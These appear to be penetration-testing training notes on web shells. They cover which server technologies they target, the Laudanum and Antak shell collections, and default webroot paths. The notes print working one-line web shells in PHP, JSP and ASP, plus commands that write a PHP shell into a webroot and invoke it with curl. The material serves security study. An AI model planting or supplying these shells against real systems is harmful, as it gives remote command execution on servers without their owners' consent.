The final type of shell we have is a `Web Shell`. A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page.

|Technology|File Extension|Language(s)|Most Common Server Platform (Real-World Usage)|
|---|---|---|---|
|**ASP**|`.asp`|VBScript, JScript|**Microsoft IIS** (versions 6–8 on legacy systems)|
|**ASP.NET (.aspx)**|`.aspx`|C#, VB.NET|**Microsoft IIS + .NET Framework / .NET Core**|
|**JSP**|`.jsp`|Java|**Apache Tomcat** (also: WildFly, GlassFish in enterprise)|
|**PHP**|`.php`|PHP|**Apache HTTP Server**, **Nginx**, sometimes **LiteSpeed**|
|**Node.js**|`.js` (server)|JavaScript (Node.js)|**Node.js runtime** (standalone), often behind **Nginx** or **Apache** reverse proxy|
#### Laudanum
Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, includes injectable files for many different web application languages to include `asp, aspx, jsp, php,` and more. it  can be found in the `/usr/share/laudanum` directory.
```bash
/usr/share/laudanum/
#  asp   aspx   cfm   helpers   jsp   php   wordpress
```

#### Antak Webshell
Antak is a web shell built in ASP.Net included within the [Nishang project](https://github.com/samratashok/nishang). Nishang is an Offensive PowerShell toolset, he a web shell functions like a Powershell Console. However, it will execute each command as a new process. It can also execute scripts in memory and encode commands you send. As a web shell, Antak is a pretty powerful tool.
```bash
/usr/share/nishang/Antak-WebShell/antak.aspx
```

#### others 
```bash
/usr/share/webshells
#  asp   aspx   cfm   jsp   laudanum   perl   php
```
#### Writing a Web Shell

First of all, we need to write our web shell that would take our command through a `GET` request, execute it, and print its output back. A web shell script is typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web languages:

Code: php

```php
<?php system($_REQUEST["cmd"]); ?>
<?php system('id'); ?>
```
Code: jsp

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

Code: asp

```asp
<% eval request("cmd") %>
```

---

#### Uploading a Web Shell
|Web Server|Default Webroot|
|---|---|
|`Apache`|/var/www/html/|
|`Nginx`|/usr/local/nginx/html/|
|`IIS`|c:\inetpub\wwwroot\|
|`XAMPP`|C:\xampp\htdocs\|
```bash
#Create a webshell php file
echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php

#Execute a command on an uploaded webshell
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

